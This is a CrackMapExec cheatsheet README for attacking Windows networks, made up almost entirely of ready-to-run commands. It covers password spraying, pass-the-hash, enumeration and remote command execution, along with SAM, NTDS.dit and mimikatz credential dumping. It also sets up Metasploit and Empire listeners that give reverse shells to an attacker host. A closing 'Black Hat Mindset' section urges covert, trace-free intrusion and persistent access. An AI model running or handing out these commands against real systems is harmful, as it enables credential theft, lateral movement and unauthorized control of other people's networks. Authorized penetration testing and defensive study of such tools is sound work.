# Basic Methodology - CrackMapExec Cheatsheet

This README provides a concise guide for using CrackMapExec to perform network penetration testing, covering connections, password spraying, enumeration, command execution, credential dumping, database usage, modules, and shell generation.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Connections & Password Spraying](#connections--password-spraying)
- [Enumeration](#enumeration)
- [Command Execution](#command-execution)
- [Credential Dumping](#credential-dumping)
- [Using the Database](#using-the-database)
- [Modules](#modules)
- [Getting Shells](#getting-shells)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

CrackMapExec (CME) is a powerful tool for automating penetration testing tasks against Windows networks, focusing on SMB, WMI, and other protocols. This cheatsheet covers essential CME commands for targeting hosts, enumerating users, executing commands, dumping credentials, and gaining shells.

## Setup and Prerequisites

- Environment: Linux host with Python 3.
- Tool: Install CrackMapExec (`pip install crackmapexec` or from GitHub: https://github.com/byt3bl33d3r/CrackMapExec).
- Dependencies: Install Metasploit Framework (for met_inject) and Empire (for empire_exec).
- Credentials: Have usernames, passwords, or hashes ready.
- Target: Identify target IPs (e.g., `192.168.215.104`, `192.168.1.0/24`).

## Connections & Password Spraying

Connect to targets and perform password spraying.

### Target Formats
```bash
crackmapexec smb ms.evilcorp.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt
```

### Null Session
```bash
crackmapexec smb 192.168.10.1 -u "" -p ""
```

### Local Account
```bash
crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth
```

### Pass-the-Hash
```bash
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'
```

### Bruteforcing & Password Spraying
```bash
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
```

## Enumeration

### Users

#### Enumerate Users
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users
```

#### RID Bruteforce for Users
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute
```

#### Domain Groups
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups
```

#### Local Users
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users
```

### Hosts

#### Relayable Hosts (SMB Signing Disabled)
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt
```

#### Enumerate Shares
```bash
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares
```

#### Active Sessions
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions
```

#### Logged-in Users
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers
```

#### Password Policy
```bash
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
```

## Command Execution

Execute commands on targets (requires admin privileges).

Execution Methods: CME uses wmiexec (WMI), atexec (scheduled task), or smbexec (service creation) in that order.

### Execute via cmd.exe
```bash
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'
```

### Force smbexec Method
```bash
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec
```

### Execute via PowerShell
```bash
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'
```

## Credential Dumping

Extract credentials from targets.

### Dump Local SAM Hashes
```bash
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
```

### Enable/Disable WDigest for Credential Dumping
```bash
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
```

### Force Logoff to Trigger WDigest
```bash
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'
```

### Dump NTDS.dit (Domain Controller)
```bash
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
```

### Dump NTDS.dit via Volume Shadow Copy
```bash
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump NTDS.dit Password History
```bash
crackmapexec smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

## Using the Database

CME automatically stores hosts and credentials in a database (cmedb).

### Access Database
```bash
$ cmedb
```

### Create and Switch Workspaces
```bash
cmedb> workspace create test
cmedb> workspace test
```

### Access Protocol Database
```bash
cmedb (test)> proto smb
cmedb (test)> back
```

### List Hosts
```bash
cmedb> hosts
```

### Detailed Host Info
```bash
cmedb> hosts <hostname>
```

### List Credentials
```bash
cmedb> creds
```

### Credentials for Specific User
```bash
cmedb> creds <username>
```

### Use Stored Credentials
```bash
crackmapexec smb 192.168.100.1 -id <credsID>
```

## Modules

Leverage CME modules for advanced tasks.

### List Modules
```bash
crackmapexec smb -L
```

### Module Info
```bash
crackmapexec smb -M mimikatz --module-info
```

### Module Options
```bash
crackmapexec smb -M mimikatz --options
```

### Mimikatz Module
```bash
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
```

### Notable Modules
- `Get-ComputerDetails`: Enumerates system info.
- `bloodhound`: Runs BloodHound recon script.
- `empire_exec`: Executes Empire launcher.
- `enum_avproducts`: Lists endpoint protection solutions.
- `enum_chrome`: Decrypts Chrome passwords.
- `enum_dns`: Dumps DNS from AD server.
- `get_keystrokes`: Logs keystrokes.
- `get_netdomaincontroller`: Enumerates domain controllers.
- `get_netrdpsession`: Lists RDP sessions.
- `get_timedscreenshot`: Takes periodic screenshots.
- `gpp_autologin`: Finds autologon info.
- `gpp_password`: Retrieves Group Policy Preference passwords.
- `invoke_sessiongopher`: Extracts session info (PuTTY, RDP, etc.).
- `invoke_vnc`: Injects VNC client.
- `met_inject`: Injects Meterpreter.
- `mimikatz`: Dumps logon credentials.
- `rdp`: Enables/disables RDP.
- `web_delivery`: Executes Metasploit web delivery.

## Getting Shells

### Metasploit

#### Set Up Reverse Handler
```bash
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST 192.168.10.3
msf exploit(handler) > set exitonsession false
msf exploit(handler) > exploit -j
```

#### Met_Inject Module
```bash
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444
```

### Empire

#### Start RESTful API
```bash
empire --rest --user empireadmin --pass gH25Iv1K68@^
```

#### Set Up HTTP Listener
```bash
(Empire: listeners) > set Name test
(Empire: listeners) > set Host 192.168.10.3
(Empire: listeners) > set Port 9090
(Empire: listeners) > set CertPath data/empire.pem
(Empire: listeners) > run
(Empire: listeners) > list
```

#### Empire Module
```bash
crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest
```

**Note**: Configure Empire API credentials in `~/.cme/cme.conf`.

## Black Hat Mindset

- **Enumerate Aggressively**: Use `--users`, `--shares`, and `--sessions` to map the network.
- **Spray Credentials**: Target large subnets with password spraying to find valid accounts.
- **Dump Credentials**: Extract SAM, NTDS.dit, and WDigest creds for lateral movement.
- **Execute Commands**: Leverage smbexec or wmiexec to run commands discreetly.
- **Gain Shells**: Use met_inject or empire_exec to establish persistent access.
- **Stay Silent**: Use CME's database to track progress without leaving traces.

## Resources

- [CrackMapExec GitHub](https://github.com/byt3bl33d3r/CrackMapExec)
- [CME Documentation](https://www.crackmapexec.wiki)
- [Metasploit Documentation](https://docs.metasploit.com)
- [Empire GitHub](https://github.com/BC-SECURITY/Empire)

